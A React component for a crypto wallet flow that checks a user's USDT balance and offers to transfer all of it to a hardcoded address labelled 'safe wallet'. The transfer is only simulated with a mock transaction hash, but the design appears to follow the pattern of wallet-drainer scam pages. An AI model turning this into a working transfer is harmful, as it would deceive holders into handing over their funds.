import { Button } from "./ui/button";
import { Card, CardContent } from "./ui/card";
import { WalletState, FlowState } from "../App";
import { Check, X, Loader2, ArrowRight, Zap, Shield } from "lucide-react";

interface AutoTransferFlowProps {
  wallet: WalletState;
  flow: FlowState;
  onTransferComplete: (txHash: string) => void;
  onError: (message: string) => void;
  onRetry: () => void;
}

const SAFE_WALLET = "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD48";

export function AutoTransferFlow({ wallet, flow, onTransferComplete, onError, onRetry }: AutoTransferFlowProps) {
  const handleApprove = async () => {
    // Start transfer
    const step = flow.step;
    if (step !== "ready") return;
    
    // Simulate transfer process
    const startTime = Date.now();
    
    // Transfer animation - minimum 1.5s for UX
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Mock transaction hash
    const mockTxHash = "0x" + Array.from({ length: 64 }, () => 
      Math.floor(Math.random() * 16).toString(16)
    ).join("");
    
    onTransferComplete(mockTxHash);
  };

  // Step indicators
  const steps = [
    { id: "connect", label: "Connect", icon: Check },
    { id: "check", label: "Check Balance", icon: flow.step === "checking" ? Loader2 : Check },
    { id: "approve", label: "Approve & Transfer", icon: flow.step === "ready" ? Shield : flow.step === "transferring" ? Loader2 : Check },
  ];

  const getStepStatus = (stepId: string) => {
    const stepOrder = ["connect", "check", "approve"];
    const currentIndex = stepOrder.indexOf(stepId);
    
    if (flow.step === "error") {
      return currentIndex < stepOrder.indexOf("check") ? "complete" : "error";
    }
    
    const flowStepMap: Record<string, number> = {
      "idle": -1,
      "connecting": 0,
      "checking": 1,
      "ready": 2,
      "transferring": 2,
      "complete": 3,
    };
    
    const currentFlowStep = flowStepMap[flow.step];
    
    if (currentIndex < currentFlowStep) return "complete";
    if (currentIndex === currentFlowStep) return "active";
    return "pending";
  };

  return (
    <div className="space-y-6">
      {/* Progress Steps */}
      <div className="flex items-center justify-center gap-2 mb-8">
        {steps.map((step, index) => {
          const status = getStepStatus(step.id);
          const Icon = step.icon;
          
          return (
            <div key={step.id} className="flex items-center gap-2">
              <div className={`
                flex items-center gap-2 px-4 py-2 rounded-full text-sm font-medium transition-all duration-300
                ${status === "complete" ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30" : ""}
                ${status === "active" ? "bg-amber-500/20 text-amber-400 border border-amber-500/30" : ""}
                ${status === "pending" ? "bg-slate-800 text-slate-500 border border-slate-700" : ""}
                ${status === "error" ? "bg-red-500/20 text-red-400 border border-red-500/30" : ""}
              `}>
                <Icon className={`w-4 h-4 ${status === "active" ? "animate-spin" : ""}`} />
                <span className="hidden sm:inline">{step.label}</span>
              </div>
              {index < steps.length - 1 && (
                <ArrowRight className="w-4 h-4 text-slate-600" />
              )}
            </div>
          );
        })}
      </div>

      {/* Main Card */}
      <Card className="bg-slate-900 border-slate-800 overflow-hidden">
        <CardContent className="p-0">
          {/* Checking State */}
          {flow.step === "checking" && (
            <div className="p-12 text-center">
              <div className="w-16 h-16 bg-amber-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
                <Loader2 className="w-8 h-8 text-amber-400 animate-spin" />
              </div>
              <h3 className="text-xl font-semibold text-white mb-2">Checking Balance...</h3>
              <p className="text-slate-400">Scanning your wallet for USDT</p>
            </div>
          )}

          {/* Ready State - Show Approve Button */}
          {flow.step === "ready" && flow.balance && (
            <div className="p-8">
              <div className="bg-slate-800 rounded-xl p-6 mb-6">
                <div className="flex items-center justify-between mb-4">
                  <div>
                    <p className="text-slate-400 text-sm mb-1">Available USDT Balance</p>
                    <p className="text-3xl font-bold text-white">
                      {parseFloat(flow.balance).toFixed(4)} <span className="text-emerald-400 text-lg">USDT</span>
                    </p>
                  </div>
                  <div className="w-12 h-12 bg-emerald-500/20 rounded-xl flex items-center justify-center">
                    <Check className="w-6 h-6 text-emerald-400" />
                  </div>
                </div>
                
                <div className="border-t border-slate-700 pt-4 mt-4 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-slate-400">Transfer Amount</span>
                    <span className="text-white font-medium">{flow.balance} USDT</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-slate-400">Destination</span>
                    <span className="text-emerald-400 font-mono text-xs">{SAFE_WALLET.slice(0, 10)}...{SAFE_WALLET.slice(-8)}</span>
                  </div>
                </div>
              </div>

              <Button
                onClick={handleApprove}
                className="w-full bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-600 hover:to-teal-600 text-white font-bold py-6 text-lg shadow-xl shadow-emerald-500/20"
              >
                <span className="flex items-center gap-3">
                  <Zap className="w-5 h-5" />
                  Approve & Transfer Instantly
                </span>
              </Button>
              
              <p className="text-center text-slate-500 text-xs mt-4">
                By clicking approve, you authorize the transfer of your USDT to the safe wallet
              </p>
            </div>
          )}

          {/* Complete State */}
          {flow.step === "complete" && (
            <div className="p-12 text-center">
              <div className="w-20 h-20 bg-emerald-500 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg shadow-emerald-500/30">
                <Check className="w-10 h-10 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-white mb-2">Transfer Complete!</h3>
              <p className="text-slate-400 mb-6">Your USDT has been successfully transferred</p>
              
              {flow.txHash && (
                <div className="bg-slate-800 rounded-lg p-4 inline-block">
                  <p className="text-slate-400 text-xs mb-1">Transaction Hash</p>
                  <p className="text-emerald-400 font-mono text-sm">{flow.txHash.slice(0, 20)}...{flow.txHash.slice(-16)}</p>
                </div>
              )}
            </div>
          )}

          {/* Error State */}
          {flow.step === "error" && (
            <div className="p-12 text-center">
              <div className="w-16 h-16 bg-red-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
                <X className="w-8 h-8 text-red-400" />
              </div>
              <h3 className="text-xl font-semibold text-white mb-2">Transfer Failed</h3>
              <p className="text-slate-400 mb-6">{flow.errorMessage || "Something went wrong"}</p>
              
              <Button
                onClick={onRetry}
                variant="outline"
                className="border-slate-700 text-slate-300 hover:bg-slate-800"
              >
                Try Again
              </Button>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}